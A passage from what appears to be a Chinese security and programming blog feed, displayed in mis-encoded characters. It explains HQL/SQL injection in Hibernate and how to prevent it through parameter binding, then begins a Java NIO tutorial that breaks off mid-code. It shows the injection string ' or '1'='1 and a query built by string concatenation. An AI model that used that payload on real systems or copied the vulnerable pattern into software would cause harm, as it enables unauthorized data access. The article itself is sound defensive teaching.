<code>&quot;zaaaa&#39; or &#39;1&#39;=&#39;1&quot;</code> æ—¶ï¼Œæœ€ç»ˆæ‹¼æ¥æˆçš„ HQL è¯­å¥ä¸ºï¼š<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> <span class="keyword">User</span> <span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;zaaaa&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure></li><li>å› ä¸º <code>OR &#39;1&#39;=&#39;1&#39;</code> æ’ä¸ºçœŸï¼ŒæŸ¥è¯¢å°†è¿”å›è¡¨ä¸­æ‰€æœ‰ç”¨æˆ·çš„è®°å½•ã€‚</li><li>æ­¤å¤„ï¼Œç”¨æˆ·é€šè¿‡æ³¨å…¥è¯­å¥æ§åˆ¶äº†æŸ¥è¯¢çš„é€»è¾‘ï¼Œå¯èƒ½å¯¼è‡´æ•°æ®æ³„éœ²ã€‚</li></ul></li></ul><h3 id="3-é¢„é˜²-HQL-æ³¨å…¥çš„å‚æ•°ç»‘å®šæ–¹å¼"><a href="#3-é¢„é˜²-HQL-æ³¨å…¥çš„å‚æ•°ç»‘å®šæ–¹å¼" class="headerlink" title="3. é¢„é˜² HQL æ³¨å…¥çš„å‚æ•°ç»‘å®šæ–¹å¼"></a>3. é¢„é˜² HQL æ³¨å…¥çš„å‚æ•°ç»‘å®šæ–¹å¼</h3><p>åœ¨ Hibernate ä¸­ï¼Œå®‰å…¨çš„å‚æ•°ç»‘å®šæ–¹å¼åŒ…æ‹¬ä½ç½®å‚æ•°ã€å‘½åå‚æ•°ã€å‘½åå‚æ•°åˆ—è¡¨å’Œç±»å®ä¾‹ã€‚è¿™äº›æ–¹æ³•å‡é‡‡ç”¨é¢„ç¼–è¯‘ï¼Œç¡®ä¿å‚æ•°åŒ–æŸ¥è¯¢ï¼Œæœ‰æ•ˆé˜²æ­¢ SQL æ³¨å…¥ã€‚</p><h4 id="3-1-ä½ç½®å‚æ•°ï¼ˆPositional-Parameterï¼‰"><a href="#3-1-ä½ç½®å‚æ•°ï¼ˆPositional-Parameterï¼‰" class="headerlink" title="3.1 ä½ç½®å‚æ•°ï¼ˆPositional Parameterï¼‰"></a>3.1 ä½ç½®å‚æ•°ï¼ˆPositional Parameterï¼‰</h4><p>ä½ç½®å‚æ•°é€šè¿‡ <code>?</code> å ä½ç¬¦æŒ‡å®šå‚æ•°ä½ç½®ï¼Œç„¶åä½¿ç”¨ <code>setParameter</code> æ–¹æ³•ç»‘å®šå‚æ•°å€¼ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">parameter</span> <span class="operator">=</span> <span class="string">&quot;z1ng&quot;</span>;</span><br><span class="line">Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;FROM User WHERE name = ?1&quot;</span>, User.class);</span><br><span class="line">query.setParameter(<span class="number">1</span>, parameter);</span><br></pre></td></tr></table></figure><ul><li><strong>æ‰§è¡Œè¿‡ç¨‹</strong>ï¼š<ul><li><code>?1</code> è¡¨ç¤ºç¬¬ä¸€ä¸ªå‚æ•°ä½ç½®ï¼Œåœ¨æŸ¥è¯¢æ—¶å°†è‡ªåŠ¨ç»‘å®š <code>parameter</code> çš„å€¼ã€‚</li><li>ä½ç½®å‚æ•°çš„é¢„ç¼–è¯‘å¯ä»¥ç¡®ä¿è¾“å…¥è¢«å½“ä½œæ•°æ®å¤„ç†ï¼Œè€Œä¸æ˜¯æŸ¥è¯¢è¯­å¥çš„ä¸€éƒ¨åˆ†ï¼Œä»è€Œé¿å… SQL æ³¨å…¥ã€‚</li></ul></li></ul><h4 id="3-2-å‘½åå‚æ•°ï¼ˆNamed-Parameterï¼‰"><a href="#3-2-å‘½åå‚æ•°ï¼ˆNamed-Parameterï¼‰" class="headerlink" title="3.2 å‘½åå‚æ•°ï¼ˆNamed Parameterï¼‰"></a>3.2 å‘½åå‚æ•°ï¼ˆNamed Parameterï¼‰</h4><p>å‘½åå‚æ•°é€šè¿‡ <code>:parameterName</code> æ ¼å¼æŒ‡å®šå‚æ•°åï¼Œå¹¶ä½¿ç”¨ <code>setParameter</code> æ–¹æ³•ç»‘å®šå…·ä½“å€¼ã€‚ç›¸æ¯”ä½ç½®å‚æ•°ï¼Œå‘½åå‚æ•°æ›´å…·å¯è¯»æ€§ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">parameter</span> <span class="operator">=</span> <span class="string">&quot;z1ng&quot;</span>;</span><br><span class="line">Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;FROM User WHERE name = :name&quot;</span>, User.class);</span><br><span class="line">query.setParameter(<span class="string">&quot;name&quot;</span>, parameter);</span><br></pre></td></tr></table></figure><ul><li><strong>æ‰§è¡Œè¿‡ç¨‹</strong>ï¼š<ul><li><code>:name</code> ä¸ºå‘½åå‚æ•°ï¼Œå ä½ç¬¦è¢«æ›¿æ¢ä¸º <code>parameter</code> çš„å€¼ã€‚</li><li>Hibernate ä¼šå°† <code>parameter</code> ä½œä¸ºæ•°æ®ç»‘å®šåˆ°æŸ¥è¯¢è¯­å¥ï¼Œä¸ä¼šå½±å“æŸ¥è¯¢é€»è¾‘ã€‚</li></ul></li></ul><h4 id="3-3-å‘½åå‚æ•°åˆ—è¡¨ï¼ˆNamed-Parameter-Listï¼‰"><a href="#3-3-å‘½åå‚æ•°åˆ—è¡¨ï¼ˆNamed-Parameter-Listï¼‰" class="headerlink" title="3.3 å‘½åå‚æ•°åˆ—è¡¨ï¼ˆNamed Parameter Listï¼‰"></a>3.3 å‘½åå‚æ•°åˆ—è¡¨ï¼ˆNamed Parameter Listï¼‰</h4><p>å‘½åå‚æ•°åˆ—è¡¨å…è®¸ç»‘å®šé›†åˆæˆ–æ•°ç»„ä½œä¸ºæŸ¥è¯¢å‚æ•°ï¼Œé€‚ç”¨äº IN æŸ¥è¯¢ç­‰å¤šå€¼åœºæ™¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; names = Arrays.asList(<span class="string">&quot;z1ng&quot;</span>, <span class="string">&quot;z2ng&quot;</span>);</span><br><span class="line">Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;FROM User WHERE name IN (:names)&quot;</span>, User.class);</span><br><span class="line">query.setParameter(<span class="string">&quot;names&quot;</span>, names);</span><br></pre></td></tr></table></figure><ul><li><strong>æ‰§è¡Œè¿‡ç¨‹</strong>ï¼š<ul><li>Hibernate ä¼šå°† <code>names</code> åˆ—è¡¨ä¸­æ¯ä¸ªå…ƒç´ ä½œä¸ºç‹¬ç«‹å‚æ•°ç»‘å®šåˆ°æŸ¥è¯¢ï¼Œé˜²æ­¢ä»»ä½•å•ä¸€å€¼å¹²æ‰°æŸ¥è¯¢ç»“æ„ã€‚</li></ul></li></ul><h4 id="3-4-ç±»å®ä¾‹ï¼ˆJavaBeanï¼‰"><a href="#3-4-ç±»å®ä¾‹ï¼ˆJavaBeanï¼‰" class="headerlink" title="3.4 ç±»å®ä¾‹ï¼ˆJavaBeanï¼‰"></a>3.4 ç±»å®ä¾‹ï¼ˆJavaBeanï¼‰</h4><p>é€šè¿‡ç±»å®ä¾‹ç»‘å®šå‚æ•°ï¼Œå°†å¯¹è±¡çš„å±æ€§ç›´æ¥æ˜ å°„åˆ°æŸ¥è¯¢å‚æ•°ä¸­ã€‚å¯ä»¥ä½¿ç”¨ <code>setProperties</code> æ–¹æ³•æ‰¹é‡ç»‘å®šå¯¹è±¡å±æ€§ï¼Œé¿å…é€ä¸ªæŒ‡å®šå‚æ•°å€¼ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user1.setName(<span class="string">&quot;z1ng&quot;</span>);</span><br><span class="line">Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;FROM User WHERE name = :name&quot;</span>, User.class);</span><br><span class="line">query.setProperties(user1);</span><br></pre></td></tr></table></figure><ul><li><strong>æ‰§è¡Œè¿‡ç¨‹</strong>ï¼š<ul><li>è¯¥æ–¹æ³•ä¼šæ ¹æ® <code>user1</code> å¯¹è±¡çš„å±æ€§è‡ªåŠ¨ç»‘å®šæŸ¥è¯¢å‚æ•°ï¼Œç¡®ä¿æŸ¥è¯¢å®‰å…¨ã€‚</li></ul></li></ul><h3 id="4-ä½¿ç”¨åŸç”Ÿ-SQL-çš„æ³¨æ„äº‹é¡¹"><a href="#4-ä½¿ç”¨åŸç”Ÿ-SQL-çš„æ³¨æ„äº‹é¡¹" class="headerlink" title="4. ä½¿ç”¨åŸç”Ÿ SQL çš„æ³¨æ„äº‹é¡¹"></a>4. ä½¿ç”¨åŸç”Ÿ SQL çš„æ³¨æ„äº‹é¡¹</h3><p>Hibernate è¿˜æ”¯æŒç›´æ¥æ‰§è¡ŒåŸç”Ÿ SQL è¯­å¥ã€‚å½“ä½¿ç”¨åŸç”Ÿ SQL æ—¶ï¼Œæ‹¼æ¥ç”¨æˆ·è¾“å…¥ä¼šå¯¼è‡´å’Œ JDBC ä¸­ç›¸åŒçš„ SQL æ³¨å…¥é£é™©ã€‚å»ºè®®é‡‡ç”¨å‚æ•°ç»‘å®šæ–¹å¼æ‰§è¡ŒåŸç”Ÿ SQL æŸ¥è¯¢ã€‚</p><h4 id="ä¸å®‰å…¨çš„åŸç”Ÿ-SQL-æ‹¼æ¥ç¤ºä¾‹"><a href="#ä¸å®‰å…¨çš„åŸç”Ÿ-SQL-æ‹¼æ¥ç¤ºä¾‹" class="headerlink" title="ä¸å®‰å…¨çš„åŸç”Ÿ SQL æ‹¼æ¥ç¤ºä¾‹"></a>ä¸å®‰å…¨çš„åŸç”Ÿ SQL æ‹¼æ¥ç¤ºä¾‹</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">parameter</span> <span class="operator">=</span> <span class="string">&quot;z1ng&quot;</span>;</span><br><span class="line">Query&lt;User&gt; query = session.createNativeQuery(<span class="string">&quot;SELECT * FROM user WHERE name = &#x27;&quot;</span> + parameter + <span class="string">&quot;&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li><strong>æ³¨å…¥é£é™©</strong>ï¼š<ul><li>ç›´æ¥å°† <code>parameter</code> æ‹¼æ¥åˆ° SQL è¯­å¥ä¸­ï¼Œæ¶æ„ç”¨æˆ·å¯ä»¥é€šè¿‡è¾“å…¥ <code>z1ng&#39; OR &#39;1&#39;=&#39;1</code> æ”¹å˜æŸ¥è¯¢é€»è¾‘ã€‚</li></ul></li></ul><h4 id="å®‰å…¨çš„åŸç”Ÿ-SQL-å‚æ•°ç»‘å®š"><a href="#å®‰å…¨çš„åŸç”Ÿ-SQL-å‚æ•°ç»‘å®š" class="headerlink" title="å®‰å…¨çš„åŸç”Ÿ SQL å‚æ•°ç»‘å®š"></a>å®‰å…¨çš„åŸç”Ÿ SQL å‚æ•°ç»‘å®š</h4><p>é€šè¿‡å‚æ•°ç»‘å®šï¼Œå¯ä»¥é¿å…æ‹¼æ¥ç”¨æˆ·è¾“å…¥å¸¦æ¥çš„æ³¨å…¥é£é™©ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">parameter</span> <span class="operator">=</span> <span class="string">&quot;z1ng&quot;</span>;</span><br><span class="line">Query&lt;User&gt; query = session.createNativeQuery(<span class="string">&quot;SELECT * FROM user WHERE name = :name&quot;</span>, User.class);</span><br><span class="line">query.setParameter(<span class="string">&quot;name&quot;</span>, parameter);</span><br></pre></td></tr></table></figure><ul><li><strong>æ‰§è¡Œè¿‡ç¨‹</strong>ï¼š<ul><li>ä½¿ç”¨ <code>:name</code> å‚æ•°å ä½ç¬¦ï¼Œ<code>parameter</code> å€¼å°†ä½œä¸ºç‹¬ç«‹æ•°æ®ç»‘å®šï¼Œç¡®ä¿æŸ¥è¯¢é€»è¾‘å®‰å…¨ã€‚</li></ul></li></ul><h3 id="5-å…¶ä»–å®‰å…¨å»ºè®®"><a href="#5-å…¶ä»–å®‰å…¨å»ºè®®" class="headerlink" title="5. å…¶ä»–å®‰å…¨å»ºè®®"></a>5. å…¶ä»–å®‰å…¨å»ºè®®</h3><h4 id="5-1-ä½¿ç”¨-Criteria-API"><a href="#5-1-ä½¿ç”¨-Criteria-API" class="headerlink" title="5.1 ä½¿ç”¨ Criteria API"></a>5.1 ä½¿ç”¨ Criteria API</h4><p>Hibernate æä¾›çš„ Criteria API å¯ä»¥åŠ¨æ€æ„å»ºæŸ¥è¯¢ï¼Œé¿å…æ‰‹åŠ¨æ‹¼æ¥ SQL æˆ– HQL è¯­å¥ï¼Œè¿›è€Œé™ä½ SQL æ³¨å…¥çš„å¯èƒ½æ€§ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CriteriaBuilder</span> <span class="variable">cb</span> <span class="operator">=</span> session.getCriteriaBuilder();</span><br><span class="line">CriteriaQuery&lt;User&gt; cq = cb.createQuery(User.class);</span><br><span class="line">Root&lt;User&gt; root = cq.from(User.class);</span><br><span class="line">cq.select(root).where(cb.equal(root.get(<span class="string">&quot;name&quot;</span>), parameter));</span><br><span class="line">List&lt;User&gt; results = session.createQuery(cq).getResultList();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Javaå¼€å‘ã€‘Java NIO</title>
      <link href="/2024/11/04/code/javanio/"/>
      <url>/2024/11/04/code/javanio/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/11/04/code/javanio/image.png"></p><p>Java NIOï¼ˆNew Input&#x2F;Outputï¼‰æ˜¯Java 1.4ä¸­å¼•å…¥çš„ä¸€å¥—æ–°çš„I&#x2F;O APIï¼Œæ—¨åœ¨æä¾›æ¯”ä¼ ç»ŸJava I&#x2F;Oæ›´é«˜æ•ˆçš„I&#x2F;Oæ“ä½œã€‚å®ƒé€šè¿‡éé˜»å¡æ¨¡å¼ã€é€šé“ï¼ˆChannelsï¼‰ã€ç¼“å†²åŒºï¼ˆBuffersï¼‰ç­‰æœºåˆ¶ï¼Œå¢å¼ºäº†Javaå¤„ç†é«˜å¹¶å‘å’Œå¤§æ•°æ®é‡æ—¶çš„æ€§èƒ½ï¼Œå°¤å…¶é€‚åˆéœ€è¦é«˜ååé‡çš„ç½‘ç»œåº”ç”¨å¼€å‘ã€‚</p><h2 id="1-Java-NIO-æ ¸å¿ƒæ¦‚å¿µ"><a href="#1-Java-NIO-æ ¸å¿ƒæ¦‚å¿µ" class="headerlink" title="1. Java NIO æ ¸å¿ƒæ¦‚å¿µ"></a>1. <strong>Java NIO æ ¸å¿ƒæ¦‚å¿µ</strong></h2><p>NIOï¼ˆNew I&#x2F;Oï¼‰çš„è®¾è®¡ç›®æ ‡æ˜¯è§£å†³ä¼ ç»Ÿ I&#x2F;Oï¼ˆBIOï¼ŒBlocking I&#x2F;Oï¼‰åœ¨å¤„ç†å¤§é‡å¹¶å‘è¿æ¥æ—¶çš„æ€§èƒ½ç“¶é¢ˆã€‚ä¼ ç»Ÿ I&#x2F;O åœ¨ç½‘ç»œé€šä¿¡ä¸­ä¸»è¦ä½¿ç”¨é˜»å¡å¼ I&#x2F;Oï¼Œä¸ºæ¯ä¸ªè¿æ¥åˆ†é…ä¸€ä¸ªçº¿ç¨‹ã€‚å½“è¿æ¥æ•°é‡å¢åŠ æ—¶ï¼Œç³»ç»Ÿæ€§èƒ½å°†å—åˆ°ä¸¥é‡å½±å“ï¼Œçº¿ç¨‹èµ„æºæˆä¸ºå…³é”®ç“¶é¢ˆã€‚è€Œ NIO æä¾›äº†éé˜»å¡ I&#x2F;O å’Œ I&#x2F;O å¤šè·¯å¤ç”¨ï¼Œå¯ä»¥åœ¨å•ä¸ªçº¿ç¨‹ä¸­å¤„ç†å¤šä¸ªå¹¶å‘è¿æ¥ï¼Œä»è€Œåœ¨ç½‘ç»œä¼ è¾“ä¸­æ˜¾è‘—æé«˜æ€§èƒ½ã€‚</p><ul><li><p><strong>Channelï¼ˆé€šé“ï¼‰</strong>ï¼šNIOä¸­çš„é€šé“ç±»ä¼¼äºä¼ ç»ŸI&#x2F;Oä¸­çš„â€œæµâ€ï¼Œä½†ä¸åŒçš„æ˜¯é€šé“æ˜¯åŒå‘çš„ï¼Œå¯ä»¥ç”¨äºè¯»å–ã€å†™å…¥æˆ–è€…åŒæ—¶æ‰§è¡Œè¿™ä¸¤ç§æ“ä½œã€‚å¸¸è§çš„é€šé“ç±»å‹åŒ…æ‹¬<code>FileChannel</code>ã€<code>SocketChannel</code>ã€<code>ServerSocketChannel</code>ã€<code>DatagramChannel</code>ç­‰ã€‚</p></li><li><p><strong>Bufferï¼ˆç¼“å†²åŒºï¼‰</strong>ï¼šç¼“å†²åŒºæ˜¯NIOä¸­ç”¨äºå­˜å‚¨æ•°æ®çš„å®¹å™¨ã€‚ä¸ä¼ ç»ŸI&#x2F;Oçš„ç›´æ¥è¯»å†™æ•°æ®ä¸åŒï¼ŒNIOé€šè¿‡å…ˆå°†æ•°æ®å†™å…¥ç¼“å†²åŒºï¼Œå†ç”±ç¼“å†²åŒºå‘é€åˆ°é€šé“ï¼Œæˆ–ä»é€šé“ä¸­è¯»å–æ•°æ®æ”¾å…¥ç¼“å†²åŒºã€‚è¿™ç§æœºåˆ¶ä½¿å¾—æ•°æ®å¯ä»¥è¢«æ›´æœ‰æ•ˆåœ°ç®¡ç†ã€‚å¸¸è§çš„ç¼“å†²åŒºæœ‰<code>ByteBuffer</code>ã€<code>CharBuffer</code>ã€<code>IntBuffer</code>ç­‰ï¼Œæ”¯æŒå¤šç§åŸºæœ¬æ•°æ®ç±»å‹ã€‚</p></li><li><p><strong>Selectorï¼ˆé€‰æ‹©å™¨ï¼‰</strong>ï¼šé€‰æ‹©å™¨ç”¨äºç®¡ç†å¤šä¸ªé€šé“ï¼Œå…è®¸å•çº¿ç¨‹å¤„ç†å¤šä¸ªé€šé“çš„äº‹ä»¶ï¼ˆå¦‚è¿æ¥è¯·æ±‚ã€è¯»å†™æ“ä½œç­‰ï¼‰ï¼Œå®ç°éé˜»å¡I&#x2F;Oçš„å¤šè·¯å¤ç”¨ã€‚å®ƒä½¿å¾—ä¸€ä¸ªçº¿ç¨‹å¯ä»¥ç›‘å¬å¤šä¸ªé€šé“çš„çŠ¶æ€ï¼ˆå¦‚è¯»ã€å†™ã€è¿æ¥ç­‰ï¼‰ï¼Œä»è€Œé¿å…äº†æ¯ä¸ªè¿æ¥ä¸€ä¸ªçº¿ç¨‹çš„èµ„æºå¼€é”€ã€‚</p></li></ul><h2 id="2-ä¸»è¦ç‰¹æ€§"><a href="#2-ä¸»è¦ç‰¹æ€§" class="headerlink" title="2. ä¸»è¦ç‰¹æ€§"></a>2. <strong>ä¸»è¦ç‰¹æ€§</strong></h2><ul><li><p><strong>éé˜»å¡I&#x2F;O</strong>ï¼šä¼ ç»ŸI&#x2F;Oæ˜¯é˜»å¡çš„ï¼Œæ¯”å¦‚å½“æ‰§è¡Œ<code>read()</code>æ—¶ï¼Œç¨‹åºä¼šä¸€ç›´ç­‰å¾…ç›´åˆ°æ•°æ®å®Œå…¨è¯»å–ã€‚è€ŒNIOå…è®¸éé˜»å¡æ“ä½œï¼Œçº¿ç¨‹åœ¨æ‰§è¡ŒI&#x2F;Oæ“ä½œæ—¶æ— éœ€ç­‰å¾…ï¼Œå¯ä»¥ç»§ç»­æ‰§è¡Œå…¶ä»–ä»»åŠ¡ã€‚è¿™å¯¹äºéœ€è¦å¤„ç†å¤§é‡å¹¶å‘è¯·æ±‚çš„æœåŠ¡å™¨åº”ç”¨éå¸¸æœ‰ç”¨ã€‚</p></li><li><p><strong>å¤šè·¯å¤ç”¨</strong>ï¼šé€šè¿‡<code>Selector</code>ï¼ŒJava NIOæ”¯æŒå•çº¿ç¨‹ç®¡ç†å¤šä¸ªé€šé“çš„è¿æ¥è¯·æ±‚ï¼Œè¿™ç§æŠ€æœ¯ç§°ä¸ºâ€œå¤šè·¯å¤ç”¨â€ï¼ˆMultiplexingï¼‰ã€‚ç›¸æ¯”ä¼ ç»Ÿçš„â€œä¸€ä¸ªè¯·æ±‚ä¸€ä¸ªçº¿ç¨‹â€æ¨¡å¼ï¼ŒNIOçš„å¤šè·¯å¤ç”¨å¯ä»¥æ˜¾è‘—å‡å°‘çº¿ç¨‹å¼€é”€ã€‚</p></li></ul><h2 id="3-Java-NIO-ä¸­çš„æ ¸å¿ƒç±»å’Œæ¥å£"><a href="#3-Java-NIO-ä¸­çš„æ ¸å¿ƒç±»å’Œæ¥å£" class="headerlink" title="3. Java NIO ä¸­çš„æ ¸å¿ƒç±»å’Œæ¥å£"></a>3. <strong>Java NIO ä¸­çš„æ ¸å¿ƒç±»å’Œæ¥å£</strong></h2><ul><li><p><strong>ByteBuffer</strong>ï¼šè¿™æ˜¯NIOä¸­æœ€å¸¸ç”¨çš„ç¼“å†²åŒºç±»ï¼Œä¸»è¦ç”¨äºå­—èŠ‚å­˜å‚¨ã€‚<code>ByteBuffer</code>æ”¯æŒç›´æ¥ç¼“å†²åŒºï¼ˆDirect Bufferï¼‰å’Œéç›´æ¥ç¼“å†²åŒºã€‚ç›´æ¥ç¼“å†²åŒºåœ¨Javaå †å¤–ç›´æ¥åˆ†é…å†…å­˜ï¼Œä¸æ“ä½œç³»ç»Ÿåº•å±‚çš„I&#x2F;Oæ“ä½œæ›´åŠ æ¥è¿‘ï¼Œé€‚åˆå¤§æ•°æ®çš„å¿«é€Ÿä¼ è¾“ã€‚</p></li><li><p><strong>FileChannel</strong>ï¼šç”¨äºæ–‡ä»¶çš„é€šé“ï¼Œé€šè¿‡<code>FileInputStream</code>ã€<code>FileOutputStream</code>ã€<code>RandomAccessFile</code>ç­‰è·å–ã€‚<code>FileChannel</code>å¯ä»¥ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®æˆ–å†™å…¥æ•°æ®ï¼Œè¿˜æ”¯æŒå†…å­˜æ˜ å°„æ–‡ä»¶ï¼ˆMappedByteBufferï¼‰ç­‰é«˜æ•ˆæ“ä½œã€‚</p></li><li><p><strong>SocketChannelã€ServerSocketChannelã€DatagramChannel</strong>ï¼šè¿™äº›é€šé“ç”¨äºç½‘ç»œé€šä¿¡ã€‚<code>SocketChannel</code>å¯ä»¥ç”¨äºTCPå®¢æˆ·ç«¯ï¼Œ<code>ServerSocketChannel</code>ç”¨äºTCPæœåŠ¡å™¨ï¼Œè€Œ<code>DatagramChannel</code>ç”¨äºUDPé€šä¿¡ã€‚</p></li><li><p><strong>Selector</strong>ï¼š<code>Selector</code>é€šè¿‡<code>select()</code>æ–¹æ³•ç›‘å¬å¤šä¸ªé€šé“çš„äº‹ä»¶ï¼ˆå¦‚è¯»ã€å†™ã€è¿æ¥ç­‰ï¼‰ï¼Œå¹¶è¿”å›å·²å‡†å¤‡å°±ç»ªçš„é€šé“ã€‚è¿™ç§æœºåˆ¶æå¤§åœ°æé«˜äº†æœåŠ¡å™¨çš„å¹¶å‘æ€§èƒ½ã€‚</p></li></ul><h2 id="4-Java-NIO-çš„æ“ä½œæµç¨‹"><a href="#4-Java-NIO-çš„æ“ä½œæµç¨‹" class="headerlink" title="4. Java NIO çš„æ“ä½œæµç¨‹"></a>4. <strong>Java NIO çš„æ“ä½œæµç¨‹</strong></h2><p>ä½¿ç”¨Java NIOè¿›è¡Œéé˜»å¡I&#x2F;Oçš„æµç¨‹é€šå¸¸å¦‚ä¸‹ï¼š</p><ol><li><strong>åˆ›å»ºé€šé“</strong>ï¼šæ‰“å¼€ä¸€ä¸ªé€šé“ï¼Œä¾‹å¦‚<code>FileChannel</code>æˆ–<code>SocketChannel</code>ã€‚</li><li><strong>é…ç½®ç¼“å†²åŒº</strong>ï¼šä¸ºé€šé“åˆ›å»ºä¸€ä¸ªæˆ–å¤šä¸ªç¼“å†²åŒºï¼Œç”¨äºå­˜å‚¨æ•°æ®ã€‚</li><li><strong>å†™å…¥æˆ–è¯»å–æ•°æ®</strong>ï¼šå°†æ•°æ®å†™å…¥ç¼“å†²åŒºæˆ–ä»ç¼“å†²åŒºè¯»å–æ•°æ®ï¼Œé€šè¿‡é€šé“ä¼ è¾“ã€‚</li><li><strong>éé˜»å¡æ¨¡å¼ä¸é€‰æ‹©å™¨</strong>ï¼šå°†é€šé“é…ç½®ä¸ºéé˜»å¡æ¨¡å¼ï¼Œå°†é€šé“æ³¨å†Œåˆ°é€‰æ‹©å™¨ä¸Šï¼Œé€šè¿‡é€‰æ‹©å™¨ç›‘å¬å¹¶å¤„ç†å¤šä¸ªé€šé“çš„äº‹ä»¶ã€‚</li><li><strong>äº‹ä»¶å¤„ç†</strong>ï¼šé€šè¿‡é€‰æ‹©å™¨çš„<code>select()</code>æ–¹æ³•è·å–å°±ç»ªçš„é€šé“é›†åˆï¼Œæ ¹æ®ä¸åŒäº‹ä»¶æ‰§è¡Œç›¸åº”çš„æ“ä½œï¼ˆè¯»ã€å†™ã€è¿æ¥ç­‰ï¼‰ã€‚</li></ol><h2 id="5-ä»£ç ç¤ºä¾‹"><a href="#5-ä»£ç ç¤ºä¾‹" class="headerlink" title="5. ä»£ç ç¤ºä¾‹"></a>5. <strong>ä»£ç ç¤ºä¾‹</strong></h2><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„NIOç¤ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•ä½¿ç”¨<code>Selector</code>å’Œ<code>SocketChannel</code>å¤„ç†éé˜»å¡ç½‘ç»œé€šä¿¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.SelectionKey;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.Selector;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.ServerSocketChannel;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.SocketChannel;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NIOServerExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Selector</span> <span class="variable">selector</span> <span class="operator">=</span> Selector.open();  <span class="comment">// åˆ›å»ºé€‰æ‹©å™¨</span></span><br><span class="line">        <span class="type">ServerSocketChannel</span> <span class="variable">serverSocket</span> <span class="operator">=</span> ServerSocketChannel.open();</span><br><span class="line">        serverSocket.bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">8080</span>));</span><br><span class="line">        serverSocket.configureBlocking(<span class="literal">false</span>);  <span class="comment">// è®¾ç½®ä¸ºéé˜»å¡æ¨¡å¼</span></span><br><span class="line">        serverSocket.register(selector, SelectionKey.OP_ACCEPT);  <span class="comment">// æ³¨å†Œé€‰æ‹©å™¨</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            selector.select();  <span class="comment">// é˜»å¡ç›´åˆ°æœ‰äº‹ä»¶è§¦å‘</span></span><br><span class="line">            Iterator&lt;SelectionKey&gt; keys = selector.selectedKeys().iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (keys.hasNext()) &#123;</span><br><span class="line">                <span class="type">SelectionKey</span> <span class="variable">key</span> <span class="operator">=</span> keys.next();</span><br><span class="line">           